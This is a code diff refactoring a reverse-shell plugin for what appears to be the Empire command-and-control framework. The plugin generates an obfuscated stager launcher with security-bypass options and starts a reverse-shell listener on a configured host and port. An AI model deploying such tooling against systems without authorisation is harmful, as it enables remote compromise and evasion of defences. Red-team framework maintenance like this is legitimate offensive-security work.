@@ -12,7 +12,7 @@ log = logging.getLogger(__name__)
 class Plugin(BasePlugin):
     @override
     def on_load(self, db):
-        self.options = {
+        self.settings_options = {
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -91,70 +91,29 @@ class Plugin(BasePlugin):
                 "Required": False,
                 "Value": "mattifestation etw",
             },
-            "Status": {
-                "Description": "<start/stop/status>",
-                "Required": True,
-                "Value": "start",
-                "SuggestedValues": ["start", "stop", "status"],
-                "Strict": True,
-            },
         }
 
     @override
-    def execute(self, command, **kwargs):
-        try:
-            self.reverseshell_proc = None
-            self.status = command["Status"]
-            return self.do_server(command, kwargs["db"])
-        except Exception as e:
-            log.error(e)
-            return False, f"[!] {e}"
+    def on_start(self, db):
+        current_settings = self.current_settings(db)
+        language = current_settings["Language"]
+        listener_name = current_settings["Listener"]
+        base64 = current_settings["Base64"]
+        obfuscate = current_settings["Obfuscate"]
+        obfuscate_command = current_settings["ObfuscateCommand"]
+        user_agent = current_settings["UserAgent"]
+        proxy = current_settings["Proxy"]
+        proxy_creds = current_settings["ProxyCreds"]
+        stager_retries = current_settings["StagerRetries"]
+        safe_checks = current_settings["SafeChecks"]
+        lhost = current_settings["LocalHost"]
+        lport = current_settings["LocalPort"]
+        encode = base64.lower() == "true"
+        invoke_obfuscation = obfuscate.lower() == "true"
 
-    def do_server(self, command, db):  # noqa: PLR0911
-        """
-        Check if the Empire C# server is already running.
-        """
-        if self.reverseshell_proc:
-            self.enabled = True
-        else:
-            self.enabled = False
-
-        if self.status == "status":
-            if self.enabled:
-                return "[+] Reverseshell server is currently running"
-            return "[!] Reverseshell server is currently stopped"
-
-        if self.status == "stop":
-            if self.enabled:
-                self.on_stop(db)
-                return "[!] Stopped reverseshell server"
-            return "[!] Reverseshell server is already stopped"
-
-        if self.status == "start":
-            # extract all of our options
-            language = command["Language"]
-            listener_name = command["Listener"]
-            base64 = command["Base64"]
-            obfuscate = command["Obfuscate"]
-            obfuscate_command = command["ObfuscateCommand"]
-            user_agent = command["UserAgent"]
-            proxy = command["Proxy"]
-            proxy_creds = command["ProxyCreds"]
-            stager_retries = command["StagerRetries"]
-            safe_checks = command["SafeChecks"]
-            lhost = command["LocalHost"]
-            lport = command["LocalPort"]
-
-            encode = False
-            if base64.lower() == "true":
-                encode = True
-
-            invoke_obfuscation = False
-            if obfuscate.lower() == "true":
-                invoke_obfuscation = True
-
-            # generate the launcher code
-            self.launcher = self.main_menu.stagergenv2.generate_launcher(
+        launcher = self.current_internal_state(db).get("Launcher")
+        if not launcher:
+            launcher = self.main_menu.stagergenv2.generate_launcher(
                 listener_name,
                 language=language,
                 encode=encode,
@@ -165,18 +124,22 @@ class Plugin(BasePlugin):
                 proxy_creds=proxy_creds,
                 stager_retries=stager_retries,
                 safe_checks=safe_checks,
-                bypasses=command["Bypasses"],
+                bypasses=current_settings["Bypasses"],
             )
 
-            if self.launcher == "":
+            if launcher == "":
                 return False, "[!] Error in launcher command generation."
 
-            self.reverseshell_proc = helpers.KThread(
-                target=self.server_listen, args=(str(lhost), str(lport))
-            )
-            self.reverseshell_proc.daemon = True
-            self.reverseshell_proc.start()
-            return None
+        # Setting in-memory so it can have repetitive access without querying the db.
+        self.launcher = launcher
+        # Setting in the db so it persists across restarts.
+        self.set_internal_state_option(db, "Launcher", launcher)
+
+        self.reverseshell_proc = helpers.KThread(
+            target=self.server_listen, args=(str(lhost), str(lport))
+        )
+        self.reverseshell_proc.daemon = True
+        self.reverseshell_proc.start()
         return None
 
     @override
